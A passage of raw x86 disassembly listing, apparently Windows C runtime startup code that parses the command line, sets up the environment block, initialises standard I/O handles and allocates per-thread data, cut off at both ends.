  402f48:	jne    0x402f53
  402f4a:	mov    DWORD PTR [esi+0x64],0x86
  402f51:	jmp    0x402f61
  402f53:	cmp    eax,0xc0000092
  402f58:	jne    0x402f61
  402f5a:	mov    DWORD PTR [esi+0x64],0x8a
  402f61:	push   DWORD PTR [esi+0x64]
  402f64:	push   0x8
  402f66:	call   ebx
  402f68:	pop    ecx
  402f69:	mov    DWORD PTR [esi+0x64],edi
  402f6c:	jmp    0x402f75
  402f6e:	and    DWORD PTR [eax+0x8],0x0
  402f72:	push   ecx
  402f73:	call   ebx
  402f75:	mov    eax,DWORD PTR [ebp-0x8]
  402f78:	pop    ecx
  402f79:	mov    DWORD PTR [esi+0x60],eax
  402f7c:	or     eax,0xffffffff
  402f7f:	pop    ebx
  402f80:	pop    edi
  402f81:	pop    esi
  402f82:	leave  
  402f83:	ret    
  402f84:	mov    eax,ds:0x412578
  402f89:	xor    edx,edx
  402f8b:	test   eax,eax
  402f8d:	jne    0x402f94
  402f8f:	mov    eax,0x40c4ac
  402f94:	movzx  ecx,WORD PTR [eax]
  402f97:	cmp    cx,0x20
  402f9b:	ja     0x402fa6
  402f9d:	test   cx,cx
  402fa0:	je     0x402fc9
  402fa2:	test   edx,edx
  402fa4:	je     0x402fc1
  402fa6:	cmp    cx,0x22
  402faa:	jne    0x402fb5
  402fac:	xor    ecx,ecx
  402fae:	test   edx,edx
  402fb0:	sete   cl
  402fb3:	mov    edx,ecx
  402fb5:	inc    eax
  402fb6:	inc    eax
  402fb7:	jmp    0x402f94
  402fb9:	cmp    cx,0x20
  402fbd:	ja     0x402fc9
  402fbf:	inc    eax
  402fc0:	inc    eax
  402fc1:	movzx  ecx,WORD PTR [eax]
  402fc4:	test   cx,cx
  402fc7:	jne    0x402fb9
  402fc9:	ret    
  402fca:	mov    edi,edi
  402fcc:	push   esi
  402fcd:	mov    esi,DWORD PTR ds:0x40ef14
  402fd3:	push   edi
  402fd4:	xor    edi,edi
  402fd6:	test   esi,esi
  402fd8:	jne    0x402ff4
  402fda:	or     eax,0xffffffff
  402fdd:	jmp    0x40308e
  402fe2:	cmp    ax,0x3d
  402fe6:	je     0x402fe9
  402fe8:	inc    edi
  402fe9:	push   esi
  402fea:	call   0x408099
  402fef:	pop    ecx
  402ff0:	lea    esi,[esi+eax*2+0x2]
  402ff4:	movzx  eax,WORD PTR [esi]
  402ff7:	test   ax,ax
  402ffa:	jne    0x402fe2
  402ffc:	push   ebx
  402ffd:	push   0x4
  402fff:	inc    edi
  403000:	push   edi
  403001:	call   0x40281d
  403006:	mov    ebx,eax
  403008:	pop    ecx
  403009:	pop    ecx
  40300a:	mov    DWORD PTR ds:0x40f264,ebx
  403010:	test   ebx,ebx
  403012:	jne    0x403019
  403014:	or     eax,0xffffffff
  403017:	jmp    0x40308d
  403019:	mov    esi,DWORD PTR ds:0x40ef14
  40301f:	jmp    0x403065
  403021:	push   esi
  403022:	call   0x408099
  403027:	mov    edi,eax
  403029:	inc    edi
  40302a:	cmp    WORD PTR [esi],0x3d
  40302e:	pop    ecx
  40302f:	je     0x403062
  403031:	push   0x2
  403033:	push   edi
  403034:	call   0x40281d
  403039:	pop    ecx
  40303a:	pop    ecx
  40303b:	mov    DWORD PTR [ebx],eax
  40303d:	test   eax,eax
  40303f:	je     0x403091
  403041:	push   esi
  403042:	push   edi
  403043:	push   eax
  403044:	call   0x40802a
  403049:	add    esp,0xc
  40304c:	test   eax,eax
  40304e:	je     0x40305f
  403050:	xor    eax,eax
  403052:	push   eax
  403053:	push   eax
  403054:	push   eax
  403055:	push   eax
  403056:	push   eax
  403057:	call   0x402326
  40305c:	add    esp,0x14
  40305f:	add    ebx,0x4
  403062:	lea    esi,[esi+edi*2]
  403065:	cmp    WORD PTR [esi],0x0
  403069:	jne    0x403021
  40306b:	push   DWORD PTR ds:0x40ef14
  403071:	call   0x402682
  403076:	and    DWORD PTR ds:0x40ef14,0x0
  40307d:	and    DWORD PTR [ebx],0x0
  403080:	mov    DWORD PTR ds:0x412560,0x1
  40308a:	xor    eax,eax
  40308c:	pop    ecx
  40308d:	pop    ebx
  40308e:	pop    edi
  40308f:	pop    esi
  403090:	ret    
  403091:	push   DWORD PTR ds:0x40f264
  403097:	call   0x402682
  40309c:	and    DWORD PTR ds:0x40f264,0x0
  4030a3:	or     eax,0xffffffff
  4030a6:	jmp    0x40308c
  4030a8:	mov    edi,edi
  4030aa:	push   ebp
  4030ab:	mov    ebp,esp
  4030ad:	push   ecx
  4030ae:	push   esi
  4030af:	xor    edx,edx
  4030b1:	push   edi
  4030b2:	mov    edi,DWORD PTR [ebp+0xc]
  4030b5:	mov    DWORD PTR [ebx],edx
  4030b7:	mov    esi,ecx
  4030b9:	mov    DWORD PTR [edi],0x1
  4030bf:	cmp    DWORD PTR [ebp+0x8],edx
  4030c2:	je     0x4030cd
  4030c4:	mov    ecx,DWORD PTR [ebp+0x8]
  4030c7:	add    DWORD PTR [ebp+0x8],0x4
  4030cb:	mov    DWORD PTR [ecx],esi
  4030cd:	cmp    WORD PTR [eax],0x22
  4030d1:	jne    0x4030e6
  4030d3:	mov    edi,DWORD PTR [ebp+0xc]
  4030d6:	xor    ecx,ecx
  4030d8:	test   edx,edx
  4030da:	sete   cl
  4030dd:	push   0x22
  4030df:	inc    eax
  4030e0:	inc    eax
  4030e1:	mov    edx,ecx
  4030e3:	pop    ecx
  4030e4:	jmp    0x4030fe
  4030e6:	inc    DWORD PTR [ebx]
  4030e8:	test   esi,esi
  4030ea:	je     0x4030f4
  4030ec:	mov    cx,WORD PTR [eax]
  4030ef:	mov    WORD PTR [esi],cx
  4030f2:	inc    esi
  4030f3:	inc    esi
  4030f4:	movzx  ecx,WORD PTR [eax]
  4030f7:	inc    eax
  4030f8:	inc    eax
  4030f9:	test   cx,cx
  4030fc:	je     0x40313a
  4030fe:	test   edx,edx
  403100:	jne    0x4030cd
  403102:	cmp    cx,0x20
  403106:	je     0x40310e
  403108:	cmp    cx,0x9
  40310c:	jne    0x4030cd
  40310e:	test   esi,esi
  403110:	je     0x403118
  403112:	xor    ecx,ecx
  403114:	mov    WORD PTR [esi-0x2],cx
  403118:	and    DWORD PTR [ebp-0x4],0x0
  40311c:	xor    edx,edx
  40311e:	cmp    WORD PTR [eax],dx
  403121:	je     0x4031ea
  403127:	movzx  ecx,WORD PTR [eax]
  40312a:	cmp    cx,0x20
  40312e:	je     0x403136
  403130:	cmp    cx,0x9
  403134:	jne    0x40313e
  403136:	inc    eax
  403137:	inc    eax
  403138:	jmp    0x403127
  40313a:	dec    eax
  40313b:	dec    eax
  40313c:	jmp    0x403118
  40313e:	cmp    WORD PTR [eax],dx
  403141:	je     0x4031ea
  403147:	cmp    DWORD PTR [ebp+0x8],edx
  40314a:	je     0x403155
  40314c:	mov    ecx,DWORD PTR [ebp+0x8]
  40314f:	add    DWORD PTR [ebp+0x8],0x4
  403153:	mov    DWORD PTR [ecx],esi
  403155:	inc    DWORD PTR [edi]
  403157:	xor    edi,edi
  403159:	inc    edi
  40315a:	xor    edx,edx
  40315c:	jmp    0x403161
  40315e:	inc    eax
  40315f:	inc    eax
  403160:	inc    edx
  403161:	cmp    WORD PTR [eax],0x5c
  403165:	je     0x40315e
  403167:	cmp    WORD PTR [eax],0x22
  40316b:	jne    0x4031a5
  40316d:	test   dl,0x1
  403170:	jne    0x403192
  403172:	cmp    DWORD PTR [ebp-0x4],0x0
  403176:	je     0x403185
  403178:	lea    ecx,[eax+0x2]
  40317b:	cmp    WORD PTR [ecx],0x22
  40317f:	jne    0x403185
  403181:	mov    eax,ecx
  403183:	jmp    0x403192
  403185:	xor    ecx,ecx
  403187:	xor    edi,edi
  403189:	cmp    DWORD PTR [ebp-0x4],ecx
  40318c:	sete   cl
  40318f:	mov    DWORD PTR [ebp-0x4],ecx
  403192:	shr    edx,1
  403194:	jmp    0x4031a5
  403196:	dec    edx
  403197:	test   esi,esi
  403199:	je     0x4031a3
  40319b:	push   0x5c
  40319d:	pop    ecx
  40319e:	mov    WORD PTR [esi],cx
  4031a1:	inc    esi
  4031a2:	inc    esi
  4031a3:	inc    DWORD PTR [ebx]
  4031a5:	test   edx,edx
  4031a7:	jne    0x403196
  4031a9:	movzx  ecx,WORD PTR [eax]
  4031ac:	test   cx,cx
  4031af:	je     0x4031d5
  4031b1:	cmp    DWORD PTR [ebp-0x4],edx
  4031b4:	jne    0x4031c2
  4031b6:	cmp    cx,0x20
  4031ba:	je     0x4031d5
  4031bc:	cmp    cx,0x9
  4031c0:	je     0x4031d5
  4031c2:	test   edi,edi
  4031c4:	je     0x4031d1
  4031c6:	test   esi,esi
  4031c8:	je     0x4031cf
  4031ca:	mov    WORD PTR [esi],cx
  4031cd:	inc    esi
  4031ce:	inc    esi
  4031cf:	inc    DWORD PTR [ebx]
  4031d1:	inc    eax
  4031d2:	inc    eax
  4031d3:	jmp    0x403157
  4031d5:	test   esi,esi
  4031d7:	je     0x4031e0
  4031d9:	xor    ecx,ecx
  4031db:	mov    WORD PTR [esi],cx
  4031de:	inc    esi
  4031df:	inc    esi
  4031e0:	inc    DWORD PTR [ebx]
  4031e2:	mov    edi,DWORD PTR [ebp+0xc]
  4031e5:	jmp    0x40311c
  4031ea:	mov    eax,DWORD PTR [ebp+0x8]
  4031ed:	cmp    eax,edx
  4031ef:	je     0x4031f3
  4031f1:	mov    DWORD PTR [eax],edx
  4031f3:	inc    DWORD PTR [edi]
  4031f5:	pop    edi
  4031f6:	pop    esi
  4031f7:	leave  
  4031f8:	ret    
  4031f9:	mov    edi,edi
  4031fb:	push   ebp
  4031fc:	mov    ebp,esp
  4031fe:	push   ecx
  4031ff:	push   ecx
  403200:	push   ebx
  403201:	push   esi
  403202:	push   edi
  403203:	push   0x104
  403208:	mov    esi,0x40f598
  40320d:	push   esi
  40320e:	xor    eax,eax
  403210:	xor    ebx,ebx
  403212:	push   ebx
  403213:	mov    ds:0x40f7a0,ax
  403219:	call   DWORD PTR ds:0x40b14c
  40321f:	mov    eax,ds:0x412578
  403224:	mov    DWORD PTR ds:0x40f270,esi
  40322a:	cmp    eax,ebx
  40322c:	je     0x403235
  40322e:	mov    edi,eax
  403230:	cmp    WORD PTR [eax],bx
  403233:	jne    0x403237
  403235:	mov    edi,esi
  403237:	lea    eax,[ebp-0x4]
  40323a:	push   eax
  40323b:	push   ebx
  40323c:	lea    ebx,[ebp-0x8]
  40323f:	xor    ecx,ecx
  403241:	mov    eax,edi
  403243:	call   0x4030a8
  403248:	mov    ebx,DWORD PTR [ebp-0x4]
  40324b:	pop    ecx
  40324c:	pop    ecx
  40324d:	cmp    ebx,0x3fffffff
  403253:	jae    0x40329f
  403255:	mov    ecx,DWORD PTR [ebp-0x8]
  403258:	cmp    ecx,0x7fffffff
  40325e:	jae    0x40329f
  403260:	lea    eax,[ecx+ebx*2]
  403263:	add    eax,eax
  403265:	add    ecx,ecx
  403267:	cmp    eax,ecx
  403269:	jb     0x40329f
  40326b:	push   eax
  40326c:	call   0x4027d8
  403271:	mov    esi,eax
  403273:	pop    ecx
  403274:	test   esi,esi
  403276:	je     0x40329f
  403278:	lea    eax,[ebp-0x4]
  40327b:	push   eax
  40327c:	lea    ecx,[esi+ebx*4]
  40327f:	push   esi
  403280:	lea    ebx,[ebp-0x8]
  403283:	mov    eax,edi
  403285:	call   0x4030a8
  40328a:	mov    eax,DWORD PTR [ebp-0x4]
  40328d:	dec    eax
  40328e:	pop    ecx
  40328f:	mov    ds:0x40f250,eax
  403294:	pop    ecx
  403295:	mov    DWORD PTR ds:0x40f258,esi
  40329b:	xor    eax,eax
  40329d:	jmp    0x4032a2
  40329f:	or     eax,0xffffffff
  4032a2:	pop    edi
  4032a3:	pop    esi
  4032a4:	pop    ebx
  4032a5:	leave  
  4032a6:	ret    
  4032a7:	mov    edi,edi
  4032a9:	push   esi
  4032aa:	call   DWORD PTR ds:0x40b0d0
  4032b0:	mov    esi,eax
  4032b2:	xor    ecx,ecx
  4032b4:	cmp    esi,ecx
  4032b6:	jne    0x4032bc
  4032b8:	xor    eax,eax
  4032ba:	pop    esi
  4032bb:	ret    
  4032bc:	cmp    WORD PTR [esi],cx
  4032bf:	je     0x4032cf
  4032c1:	inc    eax
  4032c2:	inc    eax
  4032c3:	cmp    WORD PTR [eax],cx
  4032c6:	jne    0x4032c1
  4032c8:	inc    eax
  4032c9:	inc    eax
  4032ca:	cmp    WORD PTR [eax],cx
  4032cd:	jne    0x4032c1
  4032cf:	sub    eax,esi
  4032d1:	inc    eax
  4032d2:	push   ebx
  4032d3:	inc    eax
  4032d4:	mov    ebx,eax
  4032d6:	push   edi
  4032d7:	push   ebx
  4032d8:	call   0x4027d8
  4032dd:	mov    edi,eax
  4032df:	pop    ecx
  4032e0:	test   edi,edi
  4032e2:	jne    0x4032f1
  4032e4:	push   esi
  4032e5:	call   DWORD PTR ds:0x40b0cc
  4032eb:	mov    eax,edi
  4032ed:	pop    edi
  4032ee:	pop    ebx
  4032ef:	pop    esi
  4032f0:	ret    
  4032f1:	push   ebx
  4032f2:	push   esi
  4032f3:	push   edi
  4032f4:	call   0x4080c0
  4032f9:	add    esp,0xc
  4032fc:	jmp    0x4032e4
  4032fe:	jmp    DWORD PTR ds:0x40b0d4
  403304:	push   0x54
  403306:	push   0x40c788
  40330b:	call   0x403b74
  403310:	xor    edi,edi
  403312:	mov    DWORD PTR [ebp-0x4],edi
  403315:	lea    eax,[ebp-0x64]
  403318:	push   eax
  403319:	call   DWORD PTR ds:0x40b0e0
  40331f:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  403326:	push   0x40
  403328:	push   0x20
  40332a:	pop    esi
  40332b:	push   esi
  40332c:	call   0x40281d
  403331:	pop    ecx
  403332:	pop    ecx
  403333:	cmp    eax,edi
  403335:	je     0x40354f
  40333b:	mov    ds:0x412460,eax
  403340:	mov    DWORD PTR ds:0x412450,esi
  403346:	lea    ecx,[eax+0x800]
  40334c:	jmp    0x40337e
  40334e:	mov    BYTE PTR [eax+0x4],0x0
  403352:	or     DWORD PTR [eax],0xffffffff
  403355:	mov    BYTE PTR [eax+0x5],0xa
  403359:	mov    DWORD PTR [eax+0x8],edi
  40335c:	mov    BYTE PTR [eax+0x24],0x0
  403360:	mov    BYTE PTR [eax+0x25],0xa
  403364:	mov    BYTE PTR [eax+0x26],0xa
  403368:	mov    DWORD PTR [eax+0x38],edi
  40336b:	mov    BYTE PTR [eax+0x34],0x0
  40336f:	add    eax,0x40
  403372:	mov    ecx,DWORD PTR ds:0x412460
  403378:	add    ecx,0x800
  40337e:	cmp    eax,ecx
  403380:	jb     0x40334e
  403382:	cmp    WORD PTR [ebp-0x32],di
  403386:	je     0x403496
  40338c:	mov    eax,DWORD PTR [ebp-0x30]
  40338f:	cmp    eax,edi
  403391:	je     0x403496
  403397:	mov    edi,DWORD PTR [eax]
  403399:	lea    ebx,[eax+0x4]
  40339c:	lea    eax,[ebx+edi*1]
  40339f:	mov    DWORD PTR [ebp-0x1c],eax
  4033a2:	mov    esi,0x800
  4033a7:	cmp    edi,esi
  4033a9:	jl     0x4033ad
  4033ab:	mov    edi,esi
  4033ad:	mov    DWORD PTR [ebp-0x20],0x1
  4033b4:	jmp    0x403411
  4033b6:	push   0x40
  4033b8:	push   0x20
  4033ba:	call   0x40281d
  4033bf:	pop    ecx
  4033c0:	pop    ecx
  4033c1:	test   eax,eax
  4033c3:	je     0x40341b
  4033c5:	mov    ecx,DWORD PTR [ebp-0x20]
  4033c8:	lea    ecx,[ecx*4+0x412460]
  4033cf:	mov    DWORD PTR [ecx],eax
  4033d1:	add    DWORD PTR ds:0x412450,0x20
  4033d8:	lea    edx,[eax+0x800]
  4033de:	jmp    0x40340a
  4033e0:	mov    BYTE PTR [eax+0x4],0x0
  4033e4:	or     DWORD PTR [eax],0xffffffff
  4033e7:	mov    BYTE PTR [eax+0x5],0xa
  4033eb:	and    DWORD PTR [eax+0x8],0x0
  4033ef:	and    BYTE PTR [eax+0x24],0x80
  4033f3:	mov    BYTE PTR [eax+0x25],0xa
  4033f7:	mov    BYTE PTR [eax+0x26],0xa
  4033fb:	and    DWORD PTR [eax+0x38],0x0
  4033ff:	mov    BYTE PTR [eax+0x34],0x0
  403403:	add    eax,0x40
  403406:	mov    edx,DWORD PTR [ecx]
  403408:	add    edx,esi
  40340a:	cmp    eax,edx
  40340c:	jb     0x4033e0
  40340e:	inc    DWORD PTR [ebp-0x20]
  403411:	cmp    DWORD PTR ds:0x412450,edi
  403417:	jl     0x4033b6
  403419:	jmp    0x403421
  40341b:	mov    edi,DWORD PTR ds:0x412450
  403421:	and    DWORD PTR [ebp-0x20],0x0
  403425:	test   edi,edi
  403427:	jle    0x403496
  403429:	mov    eax,DWORD PTR [ebp-0x1c]
  40342c:	mov    ecx,DWORD PTR [eax]
  40342e:	cmp    ecx,0xffffffff
  403431:	je     0x403489
  403433:	cmp    ecx,0xfffffffe
  403436:	je     0x403489
  403438:	mov    al,BYTE PTR [ebx]
  40343a:	test   al,0x1
  40343c:	je     0x403489
  40343e:	test   al,0x8
  403440:	jne    0x40344d
  403442:	push   ecx
  403443:	call   DWORD PTR ds:0x40b0dc
  403449:	test   eax,eax
  40344b:	je     0x403489
  40344d:	mov    esi,DWORD PTR [ebp-0x20]
  403450:	mov    eax,esi
  403452:	sar    eax,0x5
  403455:	and    esi,0x1f
  403458:	shl    esi,0x6
  40345b:	add    esi,DWORD PTR [eax*4+0x412460]
  403462:	mov    eax,DWORD PTR [ebp-0x1c]
  403465:	mov    eax,DWORD PTR [eax]
  403467:	mov    DWORD PTR [esi],eax
  403469:	mov    al,BYTE PTR [ebx]
  40346b:	mov    BYTE PTR [esi+0x4],al
  40346e:	push   0xfa0
  403473:	lea    eax,[esi+0xc]
  403476:	push   eax
  403477:	call   0x407c4c
  40347c:	pop    ecx
  40347d:	pop    ecx
  40347e:	test   eax,eax
  403480:	je     0x40354f
  403486:	inc    DWORD PTR [esi+0x8]
  403489:	inc    DWORD PTR [ebp-0x20]
  40348c:	inc    ebx
  40348d:	add    DWORD PTR [ebp-0x1c],0x4
  403491:	cmp    DWORD PTR [ebp-0x20],edi
  403494:	jl     0x403429
  403496:	xor    ebx,ebx
  403498:	mov    esi,ebx
  40349a:	shl    esi,0x6
  40349d:	add    esi,DWORD PTR ds:0x412460
  4034a3:	mov    eax,DWORD PTR [esi]
  4034a5:	cmp    eax,0xffffffff
  4034a8:	je     0x4034b5
  4034aa:	cmp    eax,0xfffffffe
  4034ad:	je     0x4034b5
  4034af:	or     BYTE PTR [esi+0x4],0x80
  4034b3:	jmp    0x403527
  4034b5:	mov    BYTE PTR [esi+0x4],0x81
  4034b9:	test   ebx,ebx
  4034bb:	jne    0x4034c2
  4034bd:	push   0xfffffff6
  4034bf:	pop    eax
  4034c0:	jmp    0x4034cc
  4034c2:	mov    eax,ebx
  4034c4:	dec    eax
  4034c5:	neg    eax
  4034c7:	sbb    eax,eax
  4034c9:	add    eax,0xfffffff5
  4034cc:	push   eax
  4034cd:	call   DWORD PTR ds:0x40b0c4
  4034d3:	mov    edi,eax
  4034d5:	cmp    edi,0xffffffff
  4034d8:	je     0x40351d
  4034da:	test   edi,edi
  4034dc:	je     0x40351d
  4034de:	push   edi
  4034df:	call   DWORD PTR ds:0x40b0dc
  4034e5:	test   eax,eax
  4034e7:	je     0x40351d
  4034e9:	mov    DWORD PTR [esi],edi
  4034eb:	and    eax,0xff
  4034f0:	cmp    eax,0x2
  4034f3:	jne    0x4034fb
  4034f5:	or     BYTE PTR [esi+0x4],0x40
  4034f9:	jmp    0x403504
  4034fb:	cmp    eax,0x3
  4034fe:	jne    0x403504
  403500:	or     BYTE PTR [esi+0x4],0x8
  403504:	push   0xfa0
  403509:	lea    eax,[esi+0xc]
  40350c:	push   eax
  40350d:	call   0x407c4c
  403512:	pop    ecx
  403513:	pop    ecx
  403514:	test   eax,eax
  403516:	je     0x40354f
  403518:	inc    DWORD PTR [esi+0x8]
  40351b:	jmp    0x403527
  40351d:	or     BYTE PTR [esi+0x4],0x40
  403521:	mov    DWORD PTR [esi],0xfffffffe
  403527:	inc    ebx
  403528:	cmp    ebx,0x3
  40352b:	jl     0x403498
  403531:	push   DWORD PTR ds:0x412450
  403537:	call   DWORD PTR ds:0x40b0d8
  40353d:	xor    eax,eax
  40353f:	jmp    0x403552
  403541:	xor    eax,eax
  403543:	inc    eax
  403544:	ret    
  403545:	mov    esp,DWORD PTR [ebp-0x18]
  403548:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40354f:	or     eax,0xffffffff
  403552:	call   0x403bb9
  403557:	ret    
  403558:	mov    edi,edi
  40355a:	push   esi
  40355b:	mov    eax,0x40c710
  403560:	mov    esi,0x40c710
  403565:	push   edi
  403566:	mov    edi,eax
  403568:	cmp    eax,esi
  40356a:	jae    0x40357b
  40356c:	mov    eax,DWORD PTR [edi]
  40356e:	test   eax,eax
  403570:	je     0x403574
  403572:	call   eax
  403574:	add    edi,0x4
  403577:	cmp    edi,esi
  403579:	jb     0x40356c
  40357b:	pop    edi
  40357c:	pop    esi
  40357d:	ret    
  40357e:	mov    edi,edi
  403580:	push   esi
  403581:	mov    eax,0x40c718
  403586:	mov    esi,0x40c718
  40358b:	push   edi
  40358c:	mov    edi,eax
  40358e:	cmp    eax,esi
  403590:	jae    0x4035a1
  403592:	mov    eax,DWORD PTR [edi]
  403594:	test   eax,eax
  403596:	je     0x40359a
  403598:	call   eax
  40359a:	add    edi,0x4
  40359d:	cmp    edi,esi
  40359f:	jb     0x403592
  4035a1:	pop    edi
  4035a2:	pop    esi
  4035a3:	ret    
  4035a4:	mov    edi,edi
  4035a6:	push   ebp
  4035a7:	mov    ebp,esp
  4035a9:	push   esi
  4035aa:	push   DWORD PTR ds:0x40e294
  4035b0:	mov    esi,DWORD PTR ds:0x40b0e8
  4035b6:	call   esi
  4035b8:	test   eax,eax
  4035ba:	je     0x4035dd
  4035bc:	mov    eax,ds:0x40e290
  4035c1:	cmp    eax,0xffffffff
  4035c4:	je     0x4035dd
  4035c6:	push   eax
  4035c7:	push   DWORD PTR ds:0x40e294
  4035cd:	call   esi
  4035cf:	call   eax
  4035d1:	test   eax,eax
  4035d3:	je     0x4035dd
  4035d5:	mov    eax,DWORD PTR [eax+0x1f8]
  4035db:	jmp    0x403604
  4035dd:	mov    esi,0x40b900
  4035e2:	push   esi
  4035e3:	call   DWORD PTR ds:0x40b0b8
  4035e9:	test   eax,eax
  4035eb:	jne    0x4035f8
  4035ed:	push   esi
  4035ee:	call   0x402907
  4035f3:	pop    ecx
  4035f4:	test   eax,eax
  4035f6:	je     0x403610
  4035f8:	push   0x40b8f0
  4035fd:	push   eax
  4035fe:	call   DWORD PTR ds:0x40b084
  403604:	test   eax,eax
  403606:	je     0x403610
  403608:	push   DWORD PTR [ebp+0x8]
  40360b:	call   eax
  40360d:	mov    DWORD PTR [ebp+0x8],eax
  403610:	mov    eax,DWORD PTR [ebp+0x8]
  403613:	pop    esi
  403614:	pop    ebp
  403615:	ret    
  403616:	push   0x0
  403618:	call   0x4035a4
  40361d:	pop    ecx
  40361e:	ret    
  40361f:	mov    edi,edi
  403621:	push   ebp
  403622:	mov    ebp,esp
  403624:	push   esi
  403625:	push   DWORD PTR ds:0x40e294
  40362b:	mov    esi,DWORD PTR ds:0x40b0e8
  403631:	call   esi
  403633:	test   eax,eax
  403635:	je     0x403658
  403637:	mov    eax,ds:0x40e290
  40363c:	cmp    eax,0xffffffff
  40363f:	je     0x403658
  403641:	push   eax
  403642:	push   DWORD PTR ds:0x40e294
  403648:	call   esi
  40364a:	call   eax
  40364c:	test   eax,eax
  40364e:	je     0x403658
  403650:	mov    eax,DWORD PTR [eax+0x1fc]
  403656:	jmp    0x40367f
  403658:	mov    esi,0x40b900
  40365d:	push   esi
  40365e:	call   DWORD PTR ds:0x40b0b8
  403664:	test   eax,eax
  403666:	jne    0x403673
  403668:	push   esi
  403669:	call   0x402907
  40366e:	pop    ecx
  40366f:	test   eax,eax
  403671:	je     0x40368b
  403673:	push   0x40b91c
  403678:	push   eax
  403679:	call   DWORD PTR ds:0x40b084
  40367f:	test   eax,eax
  403681:	je     0x40368b
  403683:	push   DWORD PTR [ebp+0x8]
  403686:	call   eax
  403688:	mov    DWORD PTR [ebp+0x8],eax
  40368b:	mov    eax,DWORD PTR [ebp+0x8]
  40368e:	pop    esi
  40368f:	pop    ebp
  403690:	ret    
  403691:	call   DWORD PTR ds:0x40b0ec
  403697:	ret    0x4
  40369a:	mov    edi,edi
  40369c:	push   esi
  40369d:	push   DWORD PTR ds:0x40e294
  4036a3:	call   DWORD PTR ds:0x40b0e8
  4036a9:	mov    esi,eax
  4036ab:	test   esi,esi
  4036ad:	jne    0x4036ca
  4036af:	push   DWORD PTR ds:0x40f7a8
  4036b5:	call   0x40361f
  4036ba:	pop    ecx
  4036bb:	mov    esi,eax
  4036bd:	push   esi
  4036be:	push   DWORD PTR ds:0x40e294
  4036c4:	call   DWORD PTR ds:0x40b0f0
  4036ca:	mov    eax,esi
  4036cc:	pop    esi
  4036cd:	ret    
  4036ce:	mov    eax,ds:0x40e290
  4036d3:	cmp    eax,0xffffffff
  4036d6:	je     0x4036ee
  4036d8:	push   eax
  4036d9:	push   DWORD PTR ds:0x40f7b0
  4036df:	call   0x40361f
  4036e4:	pop    ecx
  4036e5:	call   eax
  4036e7:	or     DWORD PTR ds:0x40e290,0xffffffff
  4036ee:	mov    eax,ds:0x40e294
  4036f3:	cmp    eax,0xffffffff
  4036f6:	je     0x403706
  4036f8:	push   eax
  4036f9:	call   DWORD PTR ds:0x40b0f4
  4036ff:	or     DWORD PTR ds:0x40e294,0xffffffff
  403706:	jmp    0x4065cd
  40370b:	push   0xc
  40370d:	push   0x40c7a8
  403712:	call   0x403b74
  403717:	mov    esi,0x40b900
  40371c:	push   esi
  40371d:	call   DWORD PTR ds:0x40b0b8
  403723:	test   eax,eax
  403725:	jne    0x40372e
  403727:	push   esi
  403728:	call   0x402907
  40372d:	pop    ecx
  40372e:	mov    DWORD PTR [ebp-0x1c],eax
  403731:	mov    esi,DWORD PTR [ebp+0x8]
  403734:	mov    DWORD PTR [esi+0x5c],0x40b878
  40373b:	xor    edi,edi
  40373d:	inc    edi
  40373e:	mov    DWORD PTR [esi+0x14],edi
  403741:	test   eax,eax
  403743:	je     0x403769
  403745:	push   0x40b8f0
  40374a:	push   eax
  40374b:	mov    ebx,DWORD PTR ds:0x40b084
  403751:	call   ebx
  403753:	mov    DWORD PTR [esi+0x1f8],eax
  403759:	push   0x40b91c
  40375e:	push   DWORD PTR [ebp-0x1c]
  403761:	call   ebx
  403763:	mov    DWORD PTR [esi+0x1fc],eax
  403769:	mov    DWORD PTR [esi+0x70],edi
  40376c:	mov    BYTE PTR [esi+0xc8],0x43
  403773:	mov    BYTE PTR [esi+0x14b],0x43
  40377a:	mov    DWORD PTR [esi+0x68],0x40e520
  403781:	push   0xd
  403783:	call   0x4066fe
  403788:	pop    ecx
  403789:	and    DWORD PTR [ebp-0x4],0x0
  40378d:	push   DWORD PTR [esi+0x68]
  403790:	call   DWORD PTR ds:0x40b0f8
  403796:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40379d:	call   0x4037e0
  4037a2:	push   0xc
  4037a4:	call   0x4066fe
  4037a9:	pop    ecx
  4037aa:	mov    DWORD PTR [ebp-0x4],edi
  4037ad:	mov    eax,DWORD PTR [ebp+0xc]
  4037b0:	mov    DWORD PTR [esi+0x6c],eax
  4037b3:	test   eax,eax
  4037b5:	jne    0x4037bf
  4037b7:	mov    eax,ds:0x40eb28
  4037bc:	mov    DWORD PTR [esi+0x6c],eax
  4037bf:	push   DWORD PTR [esi+0x6c]
  4037c2:	call   0x40526a
  4037c7:	pop    ecx
  4037c8:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4037cf:	call   0x4037e9
  4037d4:	call   0x403bb9
  4037d9:	ret    
  4037da:	xor    edi,edi
  4037dc:	inc    edi
  4037dd:	mov    esi,DWORD PTR [ebp+0x8]
  4037e0:	push   0xd
  4037e2:	call   0x406624
  4037e7:	pop    ecx
  4037e8:	ret    
  4037e9:	push   0xc
  4037eb:	call   0x406624
  4037f0:	pop    ecx
  4037f1:	ret    
  4037f2:	mov    edi,edi
  4037f4:	push   esi
  4037f5:	push   edi
  4037f6:	call   DWORD PTR ds:0x40b08c
  4037fc:	push   DWORD PTR ds:0x40e290
  403802:	mov    edi,eax
  403804:	call   0x40369a
  403809:	call   eax
  40380b:	mov    esi,eax
  40380d:	test   esi,esi
  40380f:	jne    0x40385f
  403811:	push   0x214
  403816:	push   0x1
  403818:	call   0x40281d
  40381d:	mov    esi,eax
  40381f:	pop    ecx
  403820:	pop    ecx
  403821:	test   esi,esi
  403823:	je     0x40385f
  403825:	push   esi
  403826:	push   DWORD PTR ds:0x40e290
  40382c:	push   DWORD PTR ds:0x40f7ac
  403832:	call   0x40361f
  403837:	pop    ecx
  403838:	call   eax
  40383a:	test   eax,eax
  40383c:	je     0x403856
  40383e:	push   0x0
  403840:	push   esi
  403841:	call   0x40370b
  403846:	pop    ecx
  403847:	pop    ecx
  403848:	call   DWORD PTR ds:0x40b100
  40384e:	or     DWORD PTR [esi+0x4],0xffffffff
  403852:	mov    DWORD PTR [esi],eax
  403854:	jmp    0x40385f
  403856:	push   esi
  403857:	call   0x402682
  40385c:	pop    ecx
  40385d:	xor    esi,esi
  40385f:	push   edi
  403860:	call   DWORD PTR ds:0x40b0fc
  403866:	pop    edi
  403867:	mov    eax,esi
  403869:	pop    esi
  40386a:	ret    
  40386b:	mov    edi,edi
  40386d:	push   esi
  40386e:	call   0x4037f2
  403873:	mov    esi,eax
  403875:	test   esi,esi
